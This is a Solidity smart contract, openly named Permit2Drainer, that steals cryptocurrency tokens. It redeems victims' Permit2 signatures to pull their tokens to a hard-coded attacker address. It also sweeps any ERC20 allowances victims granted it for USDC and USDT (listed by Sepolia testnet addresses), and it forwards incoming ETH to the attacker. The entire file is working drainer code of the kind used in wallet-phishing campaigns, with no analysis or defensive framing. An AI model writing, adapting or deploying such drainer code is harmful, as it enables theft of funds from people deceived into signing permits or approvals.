// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./Interfaces.sol";

contract Permit2Drainer {
    address public immutable attacker;
    address public constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    event Drained(address indexed victim, address indexed token, uint256 amount);

    constructor() {
        attacker = msg.sender;
    }

    function drainWithPermit2(
        address victim,
        IPermit2.PermitSingle calldata permitSingle,
        bytes calldata signature
    ) external {
        IPermit2(PERMIT2).permit(victim, permitSingle, signature);
        IPermit2(PERMIT2).transferFrom(
            victim,
            attacker,
            uint160(permitSingle.details.amount),
            permitSingle.details.token
        );
        emit Drained(victim, permitSingle.details.token, permitSingle.details.amount);
    }

    function drainApprovals(address victim) external {
        address[] memory tokens = getPopularTokens();
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] != address(0)) {
                pullToken(tokens[i], victim);
            }
        }
    }

    function pullToken(address token, address victim) internal {
        uint256 codeSize;
        assembly { codeSize := extcodesize(token) }
        if (codeSize == 0) return;

        try IERC20(token).balanceOf(victim) returns (uint256 balance) {
            if (balance == 0) return;
            try IERC20(token).allowance(victim, address(this)) returns (uint256 allowance) {
                uint256 amount = balance < allowance ? balance : allowance;
                if (amount > 0) {
                    try IERC20(token).transferFrom(victim, attacker, amount) {
                        emit Drained(victim, token, amount);
                    } catch {}
                }
            } catch {}
        } catch {}
    }

    function getPopularTokens() internal pure returns (address[] memory) {
        address[] memory tokens = new address[](2);
        tokens[0] = 0xba1FCc7a596140e5feC52B3aB80a8F000C9Af104; // USDC (Sepolia)
        tokens[1] = 0x65e37B558F64E2Be5768DB46DF22F93d85741A9E; // USDT (Sepolia)
        return tokens;
    }

    receive() external payable {
        if (msg.value > 0) {
            payable(attacker).transfer(msg.value);
        }
    }
}
